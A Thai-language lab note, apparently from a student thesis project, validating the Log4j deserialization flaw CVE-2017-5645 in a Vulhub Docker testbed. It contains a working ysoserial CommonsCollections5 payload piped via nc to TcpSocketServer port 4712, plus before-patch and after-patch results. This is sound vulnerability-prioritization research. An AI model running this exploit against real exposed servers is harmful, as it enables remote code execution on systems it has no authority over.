# Kalama Lab Note — CVE-2017-5645
**GUIDE-1: Exploitation-Validated Vulnerability Prioritization**  
**วันที่ทดสอบ:** 2026-07-20 ถึง 2026-07-21  
**ผู้ทดสอบ:** Natapat  
**อาจารย์ที่ปรึกษา:** Atthapol  

---

## 1. ข้อมูล CVE (จาก Trivy Scan)

| หัวข้อ | รายละเอียด |
|---|---|
| **CVE ID** | CVE-2017-5645 |
| **GHSA ID** | GHSA-fxph-q3j8-mv87 |
| **Package** | `org.apache.logging.log4j:log4j-core` |
| **ไฟล์ที่พบ** | `log4jrce-1.0-SNAPSHOT-all.jar` |
| **เวอร์ชันที่มีช่องโหว่** | 2.8.1 |
| **เวอร์ชันที่แก้แล้ว (FixedVersion)** | 2.8.2 |
| **Status** | fixed |
| **CWE** | CWE-502 — Deserialization of Untrusted Data |
| **Severity** | CRITICAL |
| **CVSS v3 Score** | 9.8 (NVD/GHSA) |
| **CVSS v3 Vector** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |

---

## 2. กลไกช่องโหว่ (Vulnerability Mechanism)

Log4j 2.x ก่อนเวอร์ชัน 2.8.2 มี feature ชื่อ **TcpSocketServer** และ **UdpSocketServer** สำหรับรับ log events จากแอปพลิเคชันอื่นแบบ serialized Java object ผ่าน network

ปัญหาอยู่ที่ server ทำการ **deserialize object ที่ส่งเข้ามาโดยไม่มีการ validate class whitelist** — ทำให้ผู้โจมตีสามารถส่ง serialized gadget chain ที่สร้างขึ้นเป็นพิเศษ เมื่อ server deserialize object นั้น จะ trigger การรันโค้ดตามใจชอบ (Remote Code Execution)

**Attack Flow:**
```
Attacker
   └── ส่ง serialized payload (ysoserial gadget chain)
         └──> TcpSocketServer port 4712
               └── ObjectInputStream.readObject()
                     └── deserialize CommonsCollections5 chain
                           └── trigger: touch /tmp/success (RCE)
```

**ข้อสังเกตสำหรับงานวิจัย:**  
CVSS score สูงถึง 9.8 แต่ attack surface จริงๆ แคบกว่าที่ score แสดง เพราะ TcpSocketServer ต้องถูกเปิดใช้งานเองโดยผู้ดูแลระบบ ไม่ใช่ default configuration — เป็นตัวอย่างที่ดีสำหรับ thesis ที่เทียบ theoretical score vs real exploitability

---

## 3. สภาพแวดล้อมการทดสอบ (Test Environment)

| รายการ | รายละเอียด |
|---|---|
| **Host** | KVM Ubuntu VM |
| **Testbed** | Vulhub Docker environment |
| **Before-patch image** | `vulhub/log4j:2.8.1` (pre-built จาก Docker Hub) |
| **After-patch image** | build เองจาก `~/vulhub/base/log4j/2.8.2/` |
| **Exploit tool** | ysoserial-all.jar |
| **Gadget chain** | CommonsCollections5 |
| **Scanner** | Trivy |

**โครงสร้างโฟลเดอร์:**
```
~/vulhub/log4j/
├── CVE-2017-5645/           ← before-patch (ห้ามแก้)
│   └── docker-compose.yml   (image: vulhub/log4j:2.8.1)
└── CVE-2017-5645-patch/     ← after-patch (build เอง)
    ├── Dockerfile            (copy จาก base/log4j/2.8.2/)
    ├── pom.xml               (log4j-core=2.8.2)
    ├── src/...
    └── docker-compose.yml   (build: .)
```

---

## 4. Trivy Scan (Before-Patch Oracle Verification)

**คำสั่ง:**
```bash
trivy image vulhub/log4j:2.8.1 -f json -o trivy_before.json
```

**ผลลัพธ์ที่สำคัญ:**
```json
{
  "VulnerabilityID": "CVE-2017-5645",
  "InstalledVersion": "2.8.1",
  "FixedVersion": "2.8.2",
  "Status": "fixed",
  "Severity": "CRITICAL"
}
```

**ตีความ:** Trivy ระบุว่าช่องโหว่มีอยู่จริงใน image ก่อน patch และระบุว่าเวอร์ชัน 2.8.2 แก้ไขได้ — นี่คือ oracle ที่ใช้ทำนายก่อนการ exploit จริง

---

## 5. Before-Patch Exploitation

### 5.1 Setup
```bash
cd ~/vulhub/log4j/CVE-2017-5645
docker compose up -d
```

Container IP: `172.19.0.2`  
Port: `4712` (TcpSocketServer)

### 5.2 รัน Exploit
```bash
java -jar ~/ysoserial-all.jar CommonsCollections5 "touch /tmp/success" \
  | nc 172.19.0.2 4712
```

**สังเกต:** nc ค้างอยู่ไม่ออก (connection ไม่ถูกปิดเพราะ TcpSocketServer เข้าสู่ loop รอรับ event ถัดไป หลัง deserialize สำเร็จ)

### 5.3 ตรวจสอบผล
```bash
docker exec -it cve-2017-5645-log4j-1 ls -la /tmp/
```

**ผลลัพธ์:**
```
-rw-r--r-- 1 root root 0 Jul 20 ... success
```

✅ **Exploit สำเร็จ** — `/tmp/success` ถูกสร้างขึ้นจากภายใน container

### 5.4 Cleanup
```bash
docker compose down
```

---

## 6. Patch Process

### 6.1 สาเหตุที่ต้อง Build เอง

`vulhub/log4j:2.8.2` ไม่มีบน Docker Hub เพราะ Vulhub build image ไว้เฉพาะเวอร์ชันที่มีช่องโหว่ (สำหรับ demo exploit) เท่านั้น — ต้อง build image เวอร์ชัน patched เองจาก source ที่อยู่ใน `~/vulhub/base/log4j/2.8.2/`

### 6.2 การเตรียมโฟลเดอร์ Patch

```bash
mkdir ~/vulhub/log4j/CVE-2017-5645-patch
cp -r ~/vulhub/base/log4j/2.8.2/. ~/vulhub/log4j/CVE-2017-5645-patch/
```

ยืนยัน pom.xml เวอร์ชัน:
```bash
grep -A1 log4j-core ~/vulhub/log4j/CVE-2017-5645-patch/pom.xml
# ผล: <version>2.8.2</version>
```

### 6.3 docker-compose.yml สำหรับ Patch

```yaml
services:
  log4j:
    build: .
    ports:
      - "4712:4712"
```

### 6.4 แก้ Dockerfile

Base image `openjdk:8-jre-slim` ถูกถอดออกจาก Docker Hub แล้ว ต้องเปลี่ยนเป็น:
```dockerfile
FROM eclipse-temurin:8-jre
```

เพิ่ม Maven settings.xml เพื่อบังคับใช้ HTTPS (Maven Central ปิด HTTP ตั้งแต่ปี 2020):
```dockerfile
RUN mkdir -p /root/.m2 && \
    echo '<settings><mirrors><mirror><id>central-https</id><mirrorOf>central</mirrorOf><url>https://repo.maven.apache.org/maven2</url></mirror></mirrors></settings>' \
    > /root/.m2/settings.xml
```

### 6.5 Build

```bash
cd ~/vulhub/log4j/CVE-2017-5645-patch
docker compose up --build
```

**ผลลัพธ์:**
```
[+] Building 52.1s (15/15) FINISHED
✔ Image cve-2017-5645-patch-log4j  Built
✔ Container cve-2017-5645-patch-log4j-1  Created
```

---

## 7. After-Patch Exploitation (Re-exploit)

### 7.1 ยืนยัน Container IP
```bash
docker inspect cve-2017-5645-patch-log4j-1 | grep IPAddress
# ผล: 172.20.0.2
```

### 7.2 รัน Exploit ซ้ำด้วย Payload เดิม
```bash
java -jar ~/ysoserial-all.jar CommonsCollections5 "touch /tmp/success" \
  | nc 172.20.0.2 4712
```

**สังเกต:** nc ออกทันที ไม่ค้าง (connection ถูกปิดเร็ว เพราะ server โยน exception จาก class validation แล้วปิด socket)

### 7.3 ตรวจสอบผล
```bash
docker exec -it cve-2017-5645-patch-log4j-1 ls -la /tmp/
```

**ผลลัพธ์:**
```
drwxr-xr-x 1 root root 4096 Jul 21 00:00 hsperfdata_root
```

❌ **Exploit ล้มเหลว** — ไม่มี `/tmp/success` ปรากฏ แสดงว่า patch เวิร์คจริง

---

## 8. สรุปผล Pipeline (Full Loop)

| ขั้นตอน | เครื่องมือ | ผลลัพธ์ |
|---|---|---|
| **Oracle Scan** | Trivy | พบ CVE-2017-5645 ใน log4j-core 2.8.1, FixedVersion=2.8.2 |
| **Before-patch Exploit** | ysoserial + nc | ✅ สำเร็จ (`/tmp/success` ถูกสร้าง) |
| **Patch** | แก้ pom.xml 2.8.1→2.8.2, rebuild image | Build สำเร็จ |
| **After-patch Re-exploit** | ysoserial + nc (payload เดิม) | ❌ ล้มเหลว (ไม่มี `/tmp/success`) |

**ข้อสรุปเชิงวิจัย:**  
`FixedVersion` metadata ที่ Trivy ระบุ (2.8.2) สามารถ**ยืนยันได้จริง**ด้วยการ exploit จริงๆ — สอดคล้องกับ core thesis ของ Kalama ที่ว่า empirical exploitation ให้ผลที่เชื่อถือได้มากกว่าการพึ่งแค่ theoretical score

---

## 9. ปัญหาที่พบระหว่างทาง (Lessons Learned)

| ปัญหา | สาเหตุ | วิธีแก้ |
|---|---|---|
| `vulhub/log4j:2.8.2` ไม่มีบน Docker Hub | Vulhub ไม่ push image เวอร์ชัน patched | Build เองจาก `base/log4j/2.8.2/` |
| `openjdk:8-jre-slim` ไม่มีบน Docker Hub | Docker deprecate official openjdk image แล้ว | เปลี่ยนเป็น `eclipse-temurin:8-jre` |
| Maven build fail (HTTP 501) | Maven Central ปิด HTTP ตั้งแต่ปี 2020 | เพิ่ม `settings.xml` บังคับ HTTPS |
| Disk เต็ม 100% | Docker images/layers สะสม | `docker builder prune -f` |
| `apt-key` ไม่มีในระบบ | Deprecated ใน Ubuntu รุ่นใหม่ | ใช้ `gpg --dearmor` แทน |
| nc "ค้าง" ตอน exploit สำเร็จ | TcpSocketServer loop รอ event ถัดไปหลัง deserialize | ปกติ — ใช้ `docker exec ls /tmp/` เป็นหลักฐานจริง ไม่ใช่พฤติกรรม nc |

---

## 10. หมายเหตุสำหรับ Thesis

- พฤติกรรม "nc ค้าง/ไม่ค้าง" เป็นแค่ **สัญญาณเสริม** ไม่ใช่หลักฐานหลัก — หลักฐานที่เชื่อถือได้คือการเช็ค `/tmp/success` ข้างใน container โดยตรง
- CVSS score 9.8 สูงมากแต่ pre-condition จริงๆ คือต้องมี TcpSocketServer เปิดอยู่ก่อน ซึ่งไม่ใช่ default — เป็นตัวอย่างที่ดีของ **gap ระหว่าง theoretical score กับ real-world exploitability**
- Trivy `FixedVersion` metadata ในกรณีนี้ **accurate** — 2.8.2 แก้ช่องโหว่ได้จริงตามที่ระบุ (True Positive สำหรับ patch recommendation)
- Gadget chain ที่ใช้คือ **CommonsCollections5** ไม่ใช่ CC1 เพราะ Java version ใน container ไม่ compatible กับ CC1

---

*Lab note นี้เป็นส่วนหนึ่งของโปรเจกต์ Kalama (GUIDE-1) ภายใต้การดูแลของ Atthapol*
